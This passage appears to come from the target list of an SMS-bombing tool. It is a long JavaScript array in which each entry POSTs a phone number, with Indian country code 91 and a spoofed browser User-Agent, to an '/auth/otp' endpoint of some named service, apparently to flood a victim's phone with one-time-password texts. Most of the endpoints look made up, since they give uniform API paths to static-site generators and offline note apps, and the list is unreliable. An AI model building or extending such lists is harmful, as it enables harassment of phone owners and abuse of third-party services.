        'name': 'SimpleMachines_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.simplemachines.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'PunBB_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.punbb.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'vBulletin_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.vbulletin.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'IPBoard_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.ipboard.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'WoltLab_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.woltlab.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'BurningBoard_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.burningboard.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'NodeBB_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.nodebb.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Ghost_Blog_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.ghostblog.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'WriteFreely_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.writefreely.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Plume_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.plume.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Hugo_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.hugo.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Gatsby_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.gatsby.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'NextJS_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.nextjs.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Nuxt_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.nuxt.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'SvelteKit_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.sveltekit.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Astro_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.astro.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'VuePress_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.vuepress.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Docsify_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.docsify.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'GitBook_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.gitbook.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Notion_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.notion.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Obsidian_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.obsidian.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'RoamResearch_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.roamresearch.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Logseq_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.logseq.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'TiddlyWiki_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.tiddlywiki.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Zettlr_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.zettlr.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Trilium_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.trilium.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Anytype_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.anytype.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Craft_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.craft.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Bear_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.bear.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Ulysses_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.ulysses.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Scrivener_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.scrivener.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Typora_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.typora.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'MarkText_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.marktext.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Zettlr_Cloud_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.zettlrcloud.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Notable_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.notable.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Boostnote_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.boostnote.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Caret_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.caret.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Ghostwriter_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.ghostwriter.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'QOwnNotes_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.qownnotes.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'CherryTree_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.cherrytree.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'TreePad_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.treepad.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'KeyNote_NF_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.keynotenf.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Tomboy_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.tomboy.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Gnote_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.gnote.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'RedNotebook_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.rednotebook.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'LifePIM_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.lifepim.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'EssentialPIM_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.essentialpim.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'MyLifeOrganized_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.mylifeorganized.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Todoist_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.todoist.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'TickTick_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.ticktick.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Microsoft_ToDo_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.todo.microsoft.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Google_Tasks_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.tasks.google.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Wunderlist_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.wunderlist.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'AnyDo_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.anydo.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'RememberTheMilk_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.rememberthemilk.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Toodledo_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.toodledo.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Evernote_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.evernote.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'OneNote_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.onenote.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Apple_Notes_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.notes.apple.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Google_Keep_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.keep.google.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Simplenote_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.simplenote.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'StandardNotes_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.standardnotes.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Joplin_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.joplin.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Laverna_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.laverna.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Turtl_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.turtl.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Paperwork_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.paperwork.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'TagSpaces_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.tagspaces.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'QOwnNotes_Cloud_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.qownnotescloud.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'CherryTree_Cloud_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.cherrytreecloud.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'TreePad_Cloud_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.treepadcloud.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'KeyNote_Cloud_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.keynotecloud.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Tomboy_Cloud_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.tomboycloud.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Gnote_Cloud_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.gnotecloud.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'RedNotebook_Cloud_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.rednotebookcloud.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'LifePIM_Cloud_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.lifepimcloud.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'EssentialPIM_Cloud_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.essentialpimcloud.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'MyLifeOrganized_Cloud_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.mylifeorganizedcloud.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Todoist_Cloud_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.todoistcloud.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'TickTick_Cloud_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.ticktickcloud.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Microsoft_ToDo_Cloud_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.todomicrosoftcloud.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Google_Tasks_Cloud_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.tasksgooglecloud.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Wunderlist_Cloud_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.wunderlistcloud.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'AnyDo_Cloud_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.anydocloud.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'RememberTheMilk_Cloud_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.rememberthemilkcloud.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Toodledo_Cloud_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.toodledocloud.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Evernote_Cloud_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.evernotecloud.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'OneNote_Cloud_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.onenotecloud.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Apple_Notes_Cloud_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.notesapplecloud.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Google_Keep_Cloud_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.keepgooglecloud.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Simplenote_Cloud_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.simplenotecloud.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'StandardNotes_Cloud_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.standardnotescloud.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Joplin_Cloud_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.joplincloud.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Laverna_Cloud_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.lavernacloud.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Turtl_Cloud_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.turtlcloud.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Paperwork_Cloud_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.paperworkcloud.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'TagSpaces_Cloud_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.tagspacescloud.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Miro_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.miro.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
